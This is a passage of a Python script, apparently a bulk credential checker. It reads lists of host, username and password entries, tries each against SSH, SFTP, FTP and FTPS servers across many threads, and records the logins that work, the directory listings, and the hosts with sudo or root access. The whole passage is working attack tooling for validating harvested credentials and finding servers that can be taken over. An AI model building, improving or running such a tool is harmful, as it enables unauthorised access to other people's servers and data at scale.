            f"Trying SFTP connection ({username}:{password}@{host}:{port})"
        )
        with pysftp.Connection(
            host,
            username=username,
            password=password,
            port=port,
            cnopts=cnopts,
            timeout=conn_timeout,
        ) as sftp:
            script_logger.info(
                f"Connected to SFTP server {host}:{port} with {username}:{password}"
            )
            sftp_files = sftp.listdir_attr(".")
            dir_listing = "\n".join([str(f) for f in sftp_files])
            with FILE_LOCKS["checked_sftp_dirs.txt"]:
                with open(
                    "checked_sftp_dirs.txt", "a", encoding="utf-8"
                ) as sftp_dir_output:
                    sftp_dir_output.write(
                        f"\n\nSFTP://{username}:{password}@{host}:{port}\n"
                    )
                    sftp_dir_output.write(dir_listing + "\n")
            return "SFTP", False, False, f"SFTP directory listing:\n{dir_listing}"
    except pysftp.exceptions.AuthenticationException:
        script_logger.info(
            f"🔑 Authentication failed for SFTP {username}@{host}:{port}"
        )
    except (pysftp.exceptions.ConnectionException, pysftp.exceptions.SSHException) as e:
        script_logger.info(f"🚫 SFTP connection error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for SFTP {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in SFTP: {e}", exc_info=True)
    return None


def check_ftp_login(host, port, username, password, conn_timeout):
    """
    Attempts to establish an FTP connection.
    Returns ("FTP", False, False, "") on success, or None on failure.
    """
    try:
        script_logger.debug(
            f"Trying FTP connection ({username}:{password}@{host}:{port})"
        )
        with ftplib.FTP(timeout=conn_timeout) as ftp:
            ftp.connect(host, port)
            ftp.login(username, password)
            script_logger.info(
                f"Connected to FTP server {host}:{port} with {username}:{password}"
            )
            ls = []
            ftp.retrlines("LIST -a", ls.append)
            dir_listing = "\n".join(ls)
            with FILE_LOCKS["checked_ftp_dirs.txt"]:
                with open(
                    "checked_ftp_dirs.txt", "a", encoding="utf-8"
                ) as ftp_dir_output:
                    ftp_dir_output.write(
                        f"\n\nFTP://{username}:{password}@{host}:{port}\n"
                    )
                    ftp_dir_output.write(dir_listing + "\n")
            return "FTP", False, False, f"FTP directory listing:\n{dir_listing}"
    except ftplib.error_perm as e:
        script_logger.info(f"🔑 FTP login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        script_logger.info(f"🚫 FTP connection or protocol error to {host}:{port}: {e}")
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for FTP {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in FTP: {e}", exc_info=True)
    return None


def check_ftps_login(host, port, username, password, conn_timeout):
    """
    Attempts to establish an FTPS connection.
    Returns ("FTPS", False, False, "") on success, or None on failure.
    """
    try:
        script_logger.debug(
            f"Trying FTPS connection ({username}:{password}@{host}:{port})"
        )
        with ftplib.FTP_TLS(timeout=conn_timeout) as ftps:
            ftps.connect(host, port)
            ftps.login(username, password)
            script_logger.info(
                f"Connected to FTPS server {host}:{port} with {username}:{password}"
            )
            ftps.prot_p()  # Switch to secure data connection
            ls = []
            ftps.retrlines("LIST -a", ls.append)
            dir_listing = "\n".join(ls)
            with FILE_LOCKS["checked_ftps_dirs.txt"]:
                with open(
                    "checked_ftps_dirs.txt", "a", encoding="utf-8"
                ) as ftps_dir_output:
                    ftps_dir_output.write(
                        f"\n\nFTPS://{username}:{password}@{host}:{port}\n"
                    )
                    ftps_dir_output.write(dir_listing + "\n")
            return "FTPS", False, False, f"FTPS directory listing:\n{dir_listing}"
    except ftplib.error_perm as e:
        script_logger.info(f"🔑 FTPS login failed for {username}@{host}:{port}: {e}")
    except ftplib.all_errors as e:
        script_logger.info(
            f"🚫 FTPS connection or protocol error to {host}:{port}: {e}"
        )
    except socket.timeout:
        script_logger.info(f"🕒 Connection timed out for FTPS {host}:{port}.")
    except Exception as e:
        script_logger.error(f"⚠️ Unexpected error in FTPS: {e}", exc_info=True)
    return None


def write_to_output(
    protocol,
    username,
    password,
    host,
    port,
    sudo_available=False,
    su_root_available=False,
    server_output="",
):
    """Writes successful login information and server output to various output files."""
    output_line = f"{protocol}://{username}:{password}@{host}:{port}\n"

    # Always write to a main combined output file
    with FILE_LOCKS["output.txt"]:
        with open("output.txt", "a", encoding="utf-8") as output_file:
            output_file.write(f"--- New Successful Connection ---\n")
            output_file.write(output_line)
            if server_output:
                output_file.write(f"\n[Server Interaction Log]:\n{server_output}\n")
            output_file.write(f"---------------------------------\n\n")

    # Write to protocol-specific success files
    output_filename_map = {
        "SSH": "checked_ssh.txt",
        "FTP": "checked_ftp.txt",
        "FTPS": "checked_ftps.txt",
        "SFTP": "checked_sftp.txt",
    }
    if protocol in output_filename_map:
        with FILE_LOCKS[output_filename_map[protocol]]:
            with open(
                output_filename_map[protocol], "a", encoding="utf-8"
            ) as output_file:
                output_file.write(
                    output_line
                )  # Just the connection string for these files

    # Handle SSH-specific root access files
    if protocol == "SSH" and (sudo_available or su_root_available):
        root_access_entry = output_line

        with FILE_LOCKS["root_access.txt"]:
            with open("root_access.txt", "a", encoding="utf-8") as root_file:
                root_file.write(root_access_entry)

        if sudo_available:
            with FILE_LOCKS["root_sudo.txt"]:
                with open("root_sudo.txt", "a", encoding="utf-8") as sudo_output_file:
                    sudo_output_file.write(root_access_entry)


def process_single_file(filepath, current_protocols, max_threads):
    """
    Processes a single input file, reads connection strings, and dispatches
    login attempts using a thread pool.
    """
    global TOTAL_LINES, CURRENT_LINE, stats, login_attempts

    filename = os.path.basename(filepath)
    console.print(
        f"\n[bold yellow]══════════ Starting scan on: [white]{filename}[/white] ══════════[/bold yellow]"
    )
    time.sleep(1)  # Give a moment for the message to be seen

    # --- Reset state for each new file ---
    TOTAL_LINES = 0
    CURRENT_LINE = 0
    login_attempts = {  # Reset login attempts for the current file
        "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
        "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    }

    # Count entries in the current file to set TOTAL_LINES for progress
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            lines_buffer_count = []
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if line.startswith("SSH://"):
                    TOTAL_LINES += len(current_protocols)  # Count one for each protocol
                elif line.startswith("Host:"):
                    lines_buffer_count = [line]
                elif line.startswith("Username:") and len(lines_buffer_count) == 1:
                    lines_buffer_count.append(line)
                elif line.startswith("Password:") and len(lines_buffer_count) == 2:
                    lines_buffer_count.append(line)
                    TOTAL_LINES += len(current_protocols)  # Count one for each protocol
                    lines_buffer_count = []
                else:
                    lines_buffer_count = []  # Reset if sequence is broken

    except FileNotFoundError:
        script_logger.critical(f"Input file not found: {filepath}")
        console.print(f"[bold red]❌ Input file not found: {filename}[/bold red]")
        return  # Skip to the next file
    except Exception as e:
        script_logger.critical(
            f"Error reading input file {filepath} for line count: {e}"
        )
        console.print(f"[bold red]❌ Error reading file {filename}: {e}[/bold red]")
        return  # Skip to the next file

    if TOTAL_LINES == 0:
        script_logger.warning(f"No valid host entries found in '{filepath}'. Skipping.")
        console.print(
            f"[bold yellow]⚠️ No valid host entries found in '{filename}'. Skipping.[/bold yellow]"
        )
        return

    # Initialize and start stats display for the current file
    stats = MultiProtocolFancyStats(
        total_hosts=TOTAL_LINES,
        filename=filename,
        protocols=current_protocols,
        threads=max_threads,
    )
    stats.start()
    time.sleep(0.5)  # Give display time to initialize

    try:
        # Use a ThreadPoolExecutor for this file's tasks
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            if stats:
                stats.set_active_threads(max_threads)
                stats.add_output(f"🚀 Starting scan with {max_threads} threads")

            # Keep track of all submitted futures
            all_futures = []

            with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                lines_buffer = []
                for line in f:
                    line = line.strip()
                    if not line:
                        continue

                    if line.startswith("SSH://"):
                        protocol_type, host_info = parse_connection_string(line)
                        if protocol_type and host_info:
                            # Submit tasks for ALL enabled protocols
                            for proto in current_protocols:
                                # Determine port to use based on protocol
                                port_map = {
                                    "SSH": host_info["port"],
                                    "SFTP": host_info["port"],  # SFTP uses SSH port
                                    "FTP": 21,
                                    "FTPS": 990,
                                }
                                use_port = port_map.get(proto, host_info["port"])

                                future = submit_protocol_task(
                                    executor,
                                    proto,
                                    host_info["host"],
                                    use_port,
                                    host_info["username"],
                                    host_info["password"],
                                    timeout,
                                    filepath,
                                )
                                if future:
                                    all_futures.append(future)
                        lines_buffer = []  # Reset buffer after a full entry
                    elif line.startswith("Host:"):
                        lines_buffer = [line]  # Start new buffer sequence
                    elif line.startswith("Username:") and len(lines_buffer) == 1:
                        lines_buffer.append(line)
                    elif line.startswith("Password:") and len(lines_buffer) == 2:
                        lines_buffer.append(line)

                        # Process the 3-line entry
                        host_part = lines_buffer[0].split(":", 1)[1].strip()
                        username = lines_buffer[1].split(":", 1)[1].strip()
                        password = lines_buffer[2].split(":", 1)[1].strip()

                        host = host_part
                        port = None  # Default port if not specified

                        # Check if host_part includes a port
                        if ":" in host_part:
                            try:
                                host, port_str = host_part.rsplit(":", 1)
                                port = int(port_str)
                            except ValueError:
                                script_logger.warning(
                                    f"Could not parse port from host string: {host_part}. Using default port for protocols."
                                )
                                host = host_part  # Revert host to full part if port parsing failed

                        # Submit tasks for ALL enabled protocols for this host
                        for proto in current_protocols:
                            # Use explicit port if provided, otherwise map to default
                            actual_port = port
                            if (
                                not actual_port
                            ):  # If no port specified in the line, use default
                                port_map = {
                                    "SSH": 22,
                                    "SFTP": 22,
                                    "FTP": 21,
                                    "FTPS": 990,
                                }
                                actual_port = port_map.get(proto)

                            if actual_port:
                                future = submit_protocol_task(
                                    executor,
                                    proto,
                                    host,
                                    actual_port,
                                    username,
                                    password,
                                    timeout,
                                    filepath,
                                )
                                if future:
                                    all_futures.append(future)
                            else:
                                script_logger.warning(
                                    f"Could not determine port for {proto} on {host}. Skipping."
                                )
                        lines_buffer = []  # Reset buffer after processing
                    else:
                        lines_buffer = []  # Reset buffer if sequence is broken

            if stats:
                stats.add_output(
                    f"⏳ All entries from {filename} submitted ({len(all_futures)} tasks). Waiting for completion..."
                )

            # Wait for all submitted tasks to complete
            for future in concurrent.futures.as_completed(all_futures):
                try:
                    future.result()  # Retrieve result to propagate exceptions
                except Exception as exc:
                    script_logger.error(
                        f"A task generated an exception: {exc}", exc_info=True
                    )
                    if stats:
                        stats.add_output(f"❌ Task error: {str(exc)[:50]}")

            if stats:  # Update threads to 0 after all tasks complete
                stats.set_active_threads(0)

    except KeyboardInterrupt:
        script_logger.info(f"Scan of {filename} interrupted by user.")
        if stats:
            stats.add_output("🛑 Scan interrupted by user")
    except Exception as e:
        script_logger.error(
            f"Unexpected error during processing of {filename}: {e}", exc_info=True
        )
        if stats:
            stats.add_output(f"❌ Unexpected error in file processing: {str(e)[:50]}")
    finally:
        if stats:
            stats.set_active_threads(
                0
            )  # Ensure threads count is zero at end of file processing
            stats.add_output(f"🎉 Scan of {filename} completed!")
            time.sleep(3)  # Give time for final message to be seen
            stats.stop()  # Stop the display thread for this file

        # Move the processed file to the !checked directory
        destination_path = os.path.join(CHECKED_DIR, filename)
        try:
            shutil.move(filepath, destination_path)
            script_logger.info(
                f"Moved processed file '{filepath}' to '{destination_path}'"
            )
            console.print(
                f"[bold green]✔ Moved processed file: [white]{filename}[/white] to [blue]{CHECKED_DIR}[/blue][/bold green]"
            )
        except Exception as e:
            script_logger.error(
                f"Error moving file {filepath} to {destination_path}: {e}"
            )
            console.print(f"[bold red]❌ Error moving file {filename}: {e}[/bold red]")


if __name__ == "__main__":
    # Define excluded files by their base names
    EXCLUDED_FILES = {
        "output.txt",
        "debug_log.txt",
        "root_sudo.txt",
        "root_access.txt",
        "checked_ssh.txt",
        "checked_ftp.txt",
        "checked_ftps.txt",
        "checked_sftp.txt",
        "checked_ftp_dirs.txt",
        "checked_ssh_dirs.txt",
        "checked_ftps_dirs.txt",
        "checked_sftp_dirs.txt",
    }

    def should_skip_file(filename):
        """
        Check if a file should be skipped based on its basename and specific patterns.
        This includes explicitly excluded files and files within the '!checked' directory.
        """
        basename = os.path.basename(filename)

        # 1. Check against the explicit EXCLUDED_FILES set
        if basename in EXCLUDED_FILES:
            return True

        # 2. Check for files within the CHECKED_DIR
        if os.path.dirname(filename) == CHECKED_DIR or (
            os.path.abspath(os.path.dirname(filename)) == os.path.abspath(CHECKED_DIR)
        ):
            return True

        # 3. Check for the "checked_*.txt" pattern in the filename itself (redundant with EXCLUDED_FILES, but good for robustness)
        if basename.startswith("checked_") and basename.endswith(".txt"):
            return True

        return False

    def get_input_files(directory):
        """
        Gets a list of .txt files to process from the specified directory,
        excluding files that are part of the script's output or previously checked.
        """
        files_to_process = []
        try:
            for filename in os.listdir(directory):
                full_path = os.path.join(directory, filename)
                if (
                    os.path.isfile(full_path)
                    and filename.endswith(".txt")
                    and not should_skip_file(full_path)
                ):
                    files_to_process.append(full_path)
            # Sort files for consistent processing order
            files_to_process.sort()
        except FileNotFoundError:
            script_logger.critical(f"Input directory not found: {directory}")
            console.print(
                f"[bold red]❌ Input directory not found: {directory}[/bold red]"
            )
            sys.exit(1)
        except Exception as e:
            script_logger.error(
                f"Error listing directory {directory}: {e}", exc_info=True
            )
            console.print(
                f"[bold red]❌ Error accessing directory: {directory} - {e}[/bold red]"
            )
            sys.exit(1)
        return files_to_process

    # --- Main execution flow ---
    script_logger.info(
        f"Starting script with protocols: {', '.join(protocols)} and {args.threads} threads."
    )
    script_logger.info(f"Scanning directory: {args.directory}")

    input_files_list = get_input_files(args.directory)

    if not input_files_list:
        script_logger.critical(
            f"No suitable .txt source files found in '{args.directory}' that are not already processed or excluded. Exiting."
        )
        console.print(
            f"[bold red]❌ No scannable .txt files found in: {args.directory} (or all have been processed).[/bold red]"
        )
        sys.exit(0)

    console.print(
        f"[bold green]Found {len(input_files_list)} file(s) to process: {', '.join([os.path.basename(f) for f in input_files_list])}[/bold green]\n"
    )

    # Process each file sequentially (but threads run concurrently within each file)
    for filepath in input_files_list:
        try:
            process_single_file(filepath, protocols, args.threads)
        except KeyboardInterrupt:
            console.print(
                "\n[bold red]Scan forcefully interrupted by user. Exiting.[/bold red]"
            )
            break  # Exit the loop if Ctrl+C is pressed during file processing
        except Exception as e:
            script_logger.critical(
                f"Critical error during processing of {filepath}: {e}", exc_info=True
            )
            console.print(
                f"[bold red]A critical error occurred while processing {os.path.basename(filepath)}. See debug_log.txt for details.[/bold red]"
            )

    console.print(
        "\n[bold green]✅ All discovered files have been processed.[/bold green]"
    )
    sys.exit(0)
